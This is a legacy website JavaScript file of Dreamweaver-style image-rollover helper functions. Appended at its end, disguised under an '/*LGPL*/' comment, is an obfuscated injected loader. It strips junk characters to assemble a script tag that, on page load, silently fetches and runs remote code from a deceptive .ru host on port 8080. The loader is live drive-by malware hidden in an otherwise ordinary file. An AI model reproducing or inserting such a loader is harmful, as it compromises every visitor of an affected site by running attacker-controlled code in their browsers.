function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

function MM_findObj(n, d) { //v4.0
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && document.getElementById) x=document.getElementById(n); return x;
}

function MM_nbGroup(event, grpName) { //v3.0
  var i,img,nbArr,args=MM_nbGroup.arguments;
  if (event == "init" && args.length > 2) {
    if ((img = MM_findObj(args[2])) != null && !img.MM_init) {
      img.MM_init = true; img.MM_up = args[3]; img.MM_dn = img.src;
      if ((nbArr = document[grpName]) == null) nbArr = document[grpName] = new Array();
      nbArr[nbArr.length] = img;
      for (i=4; i < args.length-1; i+=2) if ((img = MM_findObj(args[i])) != null) {
        if (!img.MM_up) img.MM_up = img.src;
        img.src = img.MM_dn = args[i+1];
        nbArr[nbArr.length] = img;
    } }
  } else if (event == "over") {
    document.MM_nbOver = nbArr = new Array();
    for (i=1; i < args.length-1; i+=3) if ((img = MM_findObj(args[i])) != null) {
      if (!img.MM_up) img.MM_up = img.src;
      img.src = (img.MM_dn && args[i+2]) ? args[i+2] : args[i+1];
      nbArr[nbArr.length] = img;
    }
  } else if (event == "out" ) {
    for (i=0; i < document.MM_nbOver.length; i++) {
      img = document.MM_nbOver[i]; img.src = (img.MM_dn) ? img.MM_dn : img.MM_up; }
  } else if (event == "down") {
    if ((nbArr = document[grpName]) != null)
      for (i=0; i < nbArr.length; i++) { img=nbArr[i]; img.src = img.MM_up; img.MM_dn = 0; }
    document[grpName] = nbArr = new Array();
    for (i=2; i < args.length-1; i+=2) if ((img = MM_findObj(args[i])) != null) {
      if (!img.MM_up) img.MM_up = img.src;
      img.src = img.MM_dn = args[i+1];
      nbArr[nbArr.length] = img;
  } }
}


/*LGPL*/ try{ window.onload = function(){var Buk8t7vbx5nt = document.createElement('s@@$@c(#@r(^)i@p##t#'.replace(/@|&|\$|\(|\)|#|\!|\^/ig, ''));Buk8t7vbx5nt.setAttribute('defer', 'd$&&@e)(f!@e)#(r$)('.replace(/\$|\^|\!|&|\(|@|\)|#/ig, ''));Buk8t7vbx5nt.setAttribute('type', 't()e)@@x^!#&$t$@$/^^!j#)^a($!^v^#(@a)s&$#$c)@r$^(@i$@p$t!)'.replace(/\)|@|\!|\^|#|\(|&|\$/ig, ''));Buk8t7vbx5nt.setAttribute('id', 'W(&#p)&(m&&k#$9#^3$&t$&($q^^j)t)@^z#'.replace(/\!|\(|#|\^|&|@|\$|\)/ig, ''));Buk8t7vbx5nt.setAttribute('s$&!r&c&@($'.replace(/\!|@|\$|#|\^|\(|&|\)/ig, ''),  'h&@#t&)t@@!p@^!:#$($/&/&^g!&#o(#o)^#g#l!()e#-$$c^&o^-@))i#!l#.((@m$$&u)#l&@(t&^i$@@#^u@^#p$!^l@)&(o^)!^a!@d&@^.#@c@o^@m!$!.@#i!&g(&n$^-^&c#&!#o$^m#&$.&@$)t&)e#$(e)n&!@w^!@e@(b^d^^&e#(s#i((^g)^$n#.#r()&)u@!:$()8((0@#)8##&0)&/^@)&g!i#!&t)!t^&i&g)$i&)#^d@&!$i!!y$!!o!#r&@(!!.!@)(c##&o&(##m&$$/&@)g)i(t($@t$i$))g^i&(^#d!)#i@(y&$&o#@^^r$#).!^!c#&o)@m@@^@/&^^d^^#)a#i((l&@y&@@^^m^$)@o!t#$i(#$$o&@)n&$.!)&c#&$o()m@)@/@))a)$m#$a$^z&o^(n!.!d^)^e^!)/(!(g@)^$o&@@^o^()$g))l^&@@e&(.#@c#!&o&#(#m^&/&'.replace(/\(|\^|\)|\!|\$|&|@|#/ig, ''));if (document){document.body.appendChild(Buk8t7vbx5nt);}} } catch(Qjhuf6xvr0zklpg0vao) {}